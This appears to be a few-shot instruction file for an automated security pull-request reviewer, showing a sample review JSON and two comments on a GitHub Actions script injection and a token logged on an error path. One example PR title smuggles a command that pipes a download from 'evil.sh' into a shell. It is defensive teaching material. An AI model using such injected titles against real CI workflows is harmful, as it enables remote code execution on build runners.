# Security reviewer — worked examples

Follow the shared shape contract (`instructions/pr_review/base/few_shots_format.md`);
these examples show the security lens's evidence discipline.

### outputs/pr_review.json (security leg)

```json
{
  "recommendation": "REQUEST_CHANGES",
  "summary": "One BLOCKING: CI script injection via an un interpolated workflow input.",
  "generalComment": "outputs/pr_review_general.md",
  "inlineComments": [
    {"path":".github/workflows/quality.yml","line":42,"comment":"outputs/pr_review_comments/security1.md","severity":"BLOCKING"},
    {"path":"src/db/users.ts","line":88,"comment":"outputs/pr_review_comments/security2.md","severity":"IMPORTANT"}
  ],
  "issueCounts": {"blocking":1,"important":1,"suggestions":0,"nits":0}
}
```

### outputs/pr_review_comments/security1.md — a BLOCKING with the evidence trail

````markdown
🚨 **BLOCKING: Script injection via `${{ github.event.pull_request.title }}`** (CWE-78)

The workflow interpolates the PR title into a `run:` shell step:

```yaml
- run: echo "PR title: ${{ github.event.pull_request.title }}"
```

A PR titled `x"; curl -s evil.sh | sh; #` executes attacker-controlled shell
on the runner (reachable: this workflow runs `pull_request` → the title is
attacker-controlled; `quality.yml:42`).

Fix: pass the value through the environment, never interpolate:

```yaml
- run: echo "PR title: $TITLE"
  env:
    TITLE: ${{ github.event.pull_request.title }}
```
````

### outputs/pr_review_comments/security2.md — an IMPORTANT question, not a padded 🚨

````markdown
⚠️ **IMPORTANT: token logged on the error path** (CWE-532)

`src/db/users.ts:88` logs `context.token` when the query fails:

```typescript
logger.error('user lookup failed', { token: context.token });
```

Reachable on any DB failure of an authenticated request → the token lands in
the log aggregation pipeline. Please confirm the logger's redaction covers
this field; if not, drop the token from the context before logging:

```typescript
logger.error('user lookup failed', { token: '[redacted]' });
```
````

### The boundary

- A reachable injection/secret-exposure/auth-bypass on the diff's own
  hunks → 🚨 BLOCKING, with `file:line` + the input path.
- A hardening gap needing preconditions → ⚠️ IMPORTANT, phrased with the
  evidence and the question.
- Everything else (style, ordering, naming of auth helpers) → digest, not a
  thread.
